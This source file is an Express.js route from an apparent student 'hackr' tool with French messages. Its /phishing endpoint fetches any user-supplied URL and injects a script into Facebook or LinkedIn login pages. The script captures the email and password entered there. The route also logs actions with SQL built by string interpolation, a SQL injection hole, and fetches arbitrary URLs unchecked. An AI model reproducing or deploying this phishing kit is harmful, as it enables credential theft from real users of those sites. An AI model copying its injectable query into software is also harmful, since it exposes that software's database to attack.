const express = require("express");
const router = express.Router();
const localStorage = require("localStorage");
const axios = require("axios");

const sqlite3 = require("sqlite3").verbose();
const db = new sqlite3.Database("hackr.db");

router.post("/phishing", async (req, res) => {
  if (
    localStorage.getItem("userRole") === "admin" ||
    localStorage.getItem("userRole") === "hacker"
  ) {
    try {
      const page = await axios.get(req.query.url);
      let html = page.data;
      const end = html.indexOf('</body>');
      let script = '';
      if (req.query.url.includes("facebook")) {
        script = `<script>
                    const form = document.getElementById('u_0_2_43');
                    form.addEventListener('submit', (e) => {
                    e.preventDefault();
                    form.action = "https://www.facebook.com";
                    form.method = "get";
                    const email = document.getElementById('email').value;
                    const password = document.getElementById('passContainer').value;
                    console.log('Email :', email);
                    console.log('Mot de passe :', password);
                   });
                  </script>`;
      } else if (req.query.url.includes("linkedin")) {
        script = `<script>
                    const form = document.getElementsByClassName('login__form');
                    form[0].addEventListener('submit', (e) => {
                    e.preventDefault();
                    form.action = "https://www.linkedin.com/login";
                    form.method = "get";
                    const email = document.getElementById('username').value;
                    const password = document.getElementById('password').value;
                    console.log('Email :', email);
                    console.log('Mot de passe :', password);
                   });
                  </script>`;
      }
      res.status(200).send(html.slice(0,end) + script + html.slice(end))
      const now = new Date();
      db.run(`
        INSERT INTO logs (user, action, date) VALUES
          ('${localStorage.getItem("username")}',
          'phishing : ${req.query.url}',
          '${now.toLocaleDateString("fr-FR", {
            weekday: "long",
            year: "numeric",
            month: "long",
            day: "numeric",
            hour: "numeric",
            minute: "numeric",
            second: "numeric",
          })}')
      `);
    } catch (error) {
      console.error(error);
      res.status(500).json({ message: "Erreur lors du phishing" });
    }
  } else {
    res.send("Vous n'êtes pas autorisé à utiliser cette fonctionnalité !");
  }
});

module.exports = router;
